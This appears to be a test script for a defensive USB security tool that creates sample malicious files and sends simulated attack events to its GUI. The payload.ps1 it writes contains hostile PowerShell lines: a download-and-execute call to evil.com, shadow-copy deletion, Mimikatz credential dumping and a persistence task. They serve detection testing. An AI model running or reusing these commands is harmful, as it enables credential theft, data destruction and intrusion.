"""
USBShield — Interactive Attack Test Runner
==========================================
Starts the full USBShield GUI and fires all 15 USB attack scenarios
as real events — with full-screen alerts, dashboard counters, and logs.

HOW TO RUN:
    python test_all_attacks.py

Each attack fires every 9 seconds. You will see:
  • Full-screen red alerts (CRITICAL / HIGH)
  • Dashboard threat counter climbing
  • Threat Logs filling up
  • For DEVICE events: "ADD TO WHITELIST" button appears and works

ALSO creates real malicious-signature test files in a temp folder and
runs FileScanner on them so you can verify detection without a USB drive.
"""

import os
import sys
import struct
import random
import shutil
import tempfile
import threading
import time

# Make sure we run from the project root
os.chdir(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.threat_logger import Severity
from main import USBShieldApp


# ── Banner ────────────────────────────────────────────────────────────────
def banner(msg: str) -> None:
    w = 60
    print("\n" + "=" * w)
    print(f"  {msg}")
    print("=" * w)


# ── Create real file payloads in a temp directory ─────────────────────────
def build_file_payloads() -> str:
    """
    Create actual files whose signatures trigger FileScanner.
    Returns path to temp directory.
    """
    tmp = tempfile.mkdtemp(prefix="usb_shield_test_")
    print(f"\n[PAYLOADS] Creating real test payload files in:\n  {tmp}\n")

    # 1. autorun.inf
    ar = os.path.join(tmp, "autorun.inf")
    with open(ar, "w") as f:
        f.write("[autorun]\nautorun=evil.exe\nshellexecute=payload.bat\nicon=shell32.dll,21\n")
    print(f"  Created: autorun.inf")

    # 2. Malicious PowerShell script (actual patterns, not documentation)
    ps1 = os.path.join(tmp, "payload.ps1")
    with open(ps1, "w") as f:
        f.write(
            'IEX (New-Object System.Net.WebClient).DownloadString("http://evil.com/p")\n'
            'powershell.exe -ExecutionPolicy Bypass -File c:\\windows\\temp\\stage2.ps1\n'
            'powershell -enc U3RhcnQtUHJvY2VzcyBjbWQgLVdpbmRvd1N0eWxlIEhpZGRlbg==\n'
            'vssadmin delete shadows /all /quiet\n'
            'Invoke-Mimikatz -DumpCreds\n'
            'schtasks /create /tn "WindowsUpdate" /tr "C:\\malware.exe" /sc onlogon\n'
            '[Convert]::FromBase64String("bWFsd2FyZQ==")\n'
            'Start-Process cmd.exe -WindowStyle Hidden\n'
        )
    print(f"  Created: payload.ps1  (8 malicious patterns)")

    # 3. Ransomware simulation: high-entropy binary with PE header
    random.seed(0xDEADBEEF)
    pe_header = bytearray(256)
    pe_header[0:2] = b"MZ"
    struct.pack_into("<I", pe_header, 0x3C, 0x40)
    pe_header[0x40:0x44] = b"PE\x00\x00"
    random_body = bytes(random.randint(0, 255) for _ in range(150_000))
    ransomware_data = bytes(pe_header) + random_body

    ransom = os.path.join(tmp, "ransomware_sim.exe")
    with open(ransom, "wb") as f:
        f.write(ransomware_data)
    print(f"  Created: ransomware_sim.exe  (PE header + entropy ~7.99 bits)")

    # 4. Trojan: PE header inside .pdf
    trojan = os.path.join(tmp, "invoice.pdf")
    with open(trojan, "wb") as f:
        f.write(ransomware_data[:10240])   # PE header + 10KB random body
    print(f"  Created: invoice.pdf  (PE header disguised as PDF)")

    # 5. Sensitive credential files
    creds_dir = os.path.join(tmp, "credentials")
    os.makedirs(creds_dir, exist_ok=True)
    for fname in ["backup.kdbx", "id_rsa.pem", "database.sql",
                  "server.ppk", "bitcoin.wallet"]:
        with open(os.path.join(creds_dir, fname), "w") as f:
            f.write("DUMMY CREDENTIAL FILE — for USBShield testing only\n")
    print(f"  Created: credentials/backup.kdbx, id_rsa.pem, database.sql, server.ppk, bitcoin.wallet")

    return tmp


# ── Scan the temp directory with FileScanner ──────────────────────────────
def run_file_scan(app: USBShieldApp, payload_dir: str) -> None:
    """Simulate StorageGuard scanning the USB drive contents."""
    print(f"\n[SCAN] Running FileScanner on payload directory...")

    from core.file_scanner import FileScanner, ThreatLevel
    from core.storage_guard import SENSITIVE_EXTENSIONS

    fs = FileScanner(app.logger)

    # Scan every file in the payload dir
    for dirpath, _, filenames in os.walk(payload_dir):
        for fname in filenames:
            fpath = os.path.join(dirpath, fname)
            threats = fs.scan_file(fpath)
            # Log each HIGH/CRITICAL threat individually (is_file_scan=True)
            for t in threats:
                if t.level in (ThreatLevel.HIGH, ThreatLevel.CRITICAL):
                    sev = Severity.CRITICAL if t.level == ThreatLevel.CRITICAL else Severity.HIGH
                    app.logger.log(
                        "FileScanner", sev,
                        f"Threat detected: {fname}",
                        t.description,
                        extra={
                            "drive":        "TEST\\",
                            "path":         fpath,
                            "category":     t.category,
                            "is_file_scan": True,
                        },
                    )

            # Sensitive file check
            ext  = os.path.splitext(fname)[1].lower()
            base = fname.lower()
            if ext in SENSITIVE_EXTENSIONS or base in SENSITIVE_EXTENSIONS:
                app.logger.log(
                    "StorageGuard", Severity.HIGH,
                    f"Sensitive file found: {fname}",
                    f"'{fname}' on TEST:\\ — possible credential theft",
                    extra={"drive": "TEST\\", "is_drive_summary": True},
                )

    # Fire one summary event for the whole scan
    app.logger.log(
        "StorageGuard", Severity.CRITICAL,
        "USB Drive TEST:\\ — 4 threat(s) detected",
        "payload.ps1 (ScriptHeuristic), ransomware_sim.exe (HighEntropy+PE), "
        "invoice.pdf (MaskedExecutable), autorun.inf (Autorun) + 5 credential files",
        extra={
            "drive":            "TEST:\\",
            "threat_count":     4,
            "is_drive_summary": True,
        },
    )
    print("[SCAN] Complete — check Dashboard and Threat Logs")


# ── All 15 attack event definitions ──────────────────────────────────────
ATTACK_EVENTS = [
    # ── #1-4: HID Keystroke Injection (burst mode)
    (
        "HIDDetector", "CRITICAL",
        "HID KEYSTROKE INJECTION — BURST DETECTED",
        "10 keys in 48 ms  |  208 keys/sec  |  100% confidence  |  Rubber Ducky signature",
        {
            "kps": 208, "confidence": 100,
            "burst_mode": True, "burst_count": 10, "burst_ms": 48,
        },
    ),
    # ── #5: Known attack device — Rubber Ducky
    (
        "DeviceMonitor", "CRITICAL",
        "USB Device Connected — KNOWN ATTACK DEVICE",
        "Hak5 Rubber Ducky [F000:0002]  KNOWN ATTACK DEVICE — device auto-blocked",
        {
            "vid": "F000", "pid": "0002",
            "device_name":  "Hak5 Rubber Ducky",
            "manufacturer": "Hak5",
            "class":        "HID",
            "instance_id":  "USB\\VID_F000&PID_0002\\TEST0001",
            "blocked": True, "risk": "CRITICAL",
        },
    ),
    # ── #1-4: HID Injection (rate mode, sustained)
    (
        "HIDDetector", "CRITICAL",
        "HID Keystroke Injection Detected",
        "287 keys/sec  |  0.5 ms variance  |  97% confidence  |  sustained injection",
        {
            "kps": 287, "confidence": 97,
            "variance_ms": 0.5, "burst_mode": False,
        },
    ),
    # ── #8: AutoRun
    (
        "StorageGuard", "HIGH",
        "autorun.inf Detected on USB Drive",
        "autorun.inf found on E:\\ — USB autorun attack vector — file neutralised",
        {"drive": "E:\\", "is_drive_summary": True},
    ),
    # ── #6-7, #9, #10-11: Drive scan summary (fires the full-screen alert)
    (
        "StorageGuard", "CRITICAL",
        "USB Drive E:\\ — 4 Threat(s) Detected",
        "payload.ps1 (PowerShell IEX), ransomware.exe (entropy 7.99), "
        "invoice.pdf (masked PE), autorun.inf (autorun vector)",
        {
            "drive": "E:\\",
            "threat_count": 4,
            "is_drive_summary": True,
        },
    ),
    # ── #12: Credential theft
    (
        "StorageGuard", "HIGH",
        "Sensitive File Copied to USB Drive",
        "'backup.kdbx' (KeePass database) written to E:\\ — possible credential theft",
        {"drive": "E:\\", "is_drive_summary": True},
    ),
    # ── #13: Data exfiltration
    (
        "StorageGuard", "CRITICAL",
        "Data Exfiltration Detected",
        "142.3 MB  /  67 files copied to E:\\ in 60 seconds — exceeds 100 MB threshold",
        {
            "drive": "E:\\", "mb": 142.3,
            "file_count": 67, "is_drive_summary": True,
        },
    ),
    # ── #5: Second known device — Bash Bunny
    (
        "DeviceMonitor", "CRITICAL",
        "USB Device Connected — KNOWN ATTACK DEVICE",
        "Hak5 Bash Bunny [F000:0014]  KNOWN ATTACK DEVICE — device auto-blocked",
        {
            "vid": "F000", "pid": "0014",
            "device_name":  "Hak5 Bash Bunny",
            "manufacturer": "Hak5",
            "class":        "HID",
            "instance_id":  "USB\\VID_F000&PID_0014\\TEST0002",
            "blocked": True, "risk": "CRITICAL",
        },
    ),
    # ── #14: Rogue USB network adapter
    (
        "NetworkGuard", "CRITICAL",
        "Rogue USB Network Adapter Detected",
        "RNDIS Gadget (MAC 02:00:DE:AD:BE:EF) matches attack tool pattern — "
        "possible man-in-the-middle",
        {
            "adapter_name": "RNDIS Gadget",
            "mac": "02:00:DE:AD:BE:EF",
            "is_drive_summary": True,
        },
    ),
    # ── #15: Unsigned driver
    (
        "DriverMonitor", "CRITICAL",
        "Unsigned USB Driver Installed — Possible Rootkit",
        "BadUSB.sys is UNSIGNED — kernel-level rootkit possible — run full system scan",
        {
            "driver_name": "BadUSB.sys",
            "is_drive_summary": True,
        },
    ),
    # ── #5: Third known device — Digispark
    (
        "DeviceMonitor", "CRITICAL",
        "USB Device Connected — KNOWN ATTACK DEVICE",
        "Digispark ATtiny85 [1209:2900]  HID injection microcontroller — auto-blocked",
        {
            "vid": "1209", "pid": "2900",
            "device_name":  "Digispark ATtiny85",
            "manufacturer": "Digistump",
            "class":        "HID",
            "instance_id":  "USB\\VID_1209&PID_2900\\TEST0003",
            "blocked": True, "risk": "CRITICAL",
        },
    ),
    # ── #13: Second exfiltration wave
    (
        "StorageGuard", "CRITICAL",
        "Data Exfiltration Detected",
        "51 files copied to F:\\ in 60 seconds — bulk copy threshold exceeded",
        {
            "drive": "F:\\", "mb": 60.0,
            "file_count": 51, "is_drive_summary": True,
        },
    ),
    # ── #1-4: HID injection on unknown HID device
    (
        "HIDDetector", "CRITICAL",
        "HID Keystroke Injection — BURST DETECTED",
        "15 keys in 62 ms  |  241 keys/sec  |  100% confidence  |  sustained attack",
        {
            "kps": 241, "confidence": 100,
            "burst_mode": True, "burst_count": 15, "burst_ms": 62,
        },
    ),
    # ── #14: Second rogue adapter
    (
        "NetworkGuard", "CRITICAL",
        "Rogue USB Network Adapter Detected",
        "CDC Ethernet Gadget (MAC 02:00:BE:EF:CA:FE) — USB MITM adapter detected",
        {
            "adapter_name": "CDC Ethernet Gadget",
            "mac": "02:00:BE:EF:CA:FE",
            "is_drive_summary": True,
        },
    ),
    # ── #5: Unknown HID device (not in DB but still flagged)
    (
        "DeviceMonitor", "HIGH",
        "Unknown HID Device Connected",
        "Unrecognised HID peripheral [ABCD:1234] — not on approved whitelist",
        {
            "vid": "ABCD", "pid": "1234",
            "device_name":  "Unknown HID Device",
            "manufacturer": "Unknown",
            "class":        "HID",
            "instance_id":  "USB\\VID_ABCD&PID_1234\\TEST0004",
            "blocked": False, "risk": "HIGH",
        },
    ),
]


# ── Event injection thread ─────────────────────────────────────────────────
def inject_attacks(app: USBShieldApp, payload_dir: str) -> None:
    DELAY = 9   # seconds between attacks

    # Give the GUI time to fully load
    time.sleep(3)

    banner("FILE SCAN — real payload files being scanned")
    run_file_scan(app, payload_dir)
    time.sleep(DELAY)

    for i, (cat, sev_str, title, desc, extra) in enumerate(ATTACK_EVENTS):
        banner(f"ATTACK {i+1:02d}/{len(ATTACK_EVENTS)}: {title[:48]}")
        app.logger.log(cat, Severity[sev_str], title, desc, extra=extra)
        time.sleep(DELAY)

    banner("ALL ATTACKS COMPLETE — review Dashboard and Threat Logs")


# ── Entry point ────────────────────────────────────────────────────────────
def main() -> None:
    print("=" * 60)
    print("  USBShield — Attack Test Runner")
    print("  Starting with Administrator privileges...")
    print("=" * 60)

    # Build real payload files
    payload_dir = build_file_payloads()

    # Start the app (no WMI monitor needed for test mode)
    app = USBShieldApp()
    app.start()

    # Fire attacks in background thread
    t = threading.Thread(
        target=inject_attacks, args=(app, payload_dir), daemon=True
    )
    t.start()

    # Open GUI
    from gui.main_window import MainWindow
    window = MainWindow(app)
    try:
        window.run()
    finally:
        app.stop()
        try:
            shutil.rmtree(payload_dir, ignore_errors=True)
        except Exception:
            pass


if __name__ == "__main__":
    main()
